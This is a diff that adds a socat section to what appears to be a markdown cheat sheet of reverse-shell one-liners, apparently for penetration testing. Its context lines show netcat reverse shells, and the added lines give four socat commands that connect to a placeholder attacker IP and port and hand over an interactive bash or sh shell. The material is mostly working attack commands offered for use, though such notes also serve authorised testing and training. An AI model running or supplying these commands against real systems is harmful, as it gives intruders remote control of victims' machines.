@@ -197,6 +197,21 @@ nc.exe -e cmd.exe <IP> <PORT>
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
 ```
 
+###### [Linux] Socat
+
+`socat` is a command line utility that establishes two bidirectional byte
+streams and transfers data between them, often considered as a more advanced
+version of `netcat`. It can for example have multiple clients listening on a
+same port or reuse a connection. It is rarely present by default in Linux
+distributions.
+
+```
+socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
+socat tcp-connect:<IP>:<PORT> exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane
+socat tcp-connect:<IP>:<PORT> exec:"sh -li",pty,stderr,setsid,sigint,sane
+socat tcp-connect:<IP>:<PORT> exec:"/bin/sh -li",pty,stderr,setsid,sigint,sane
+```
+
 ###### Python
 
 ```python
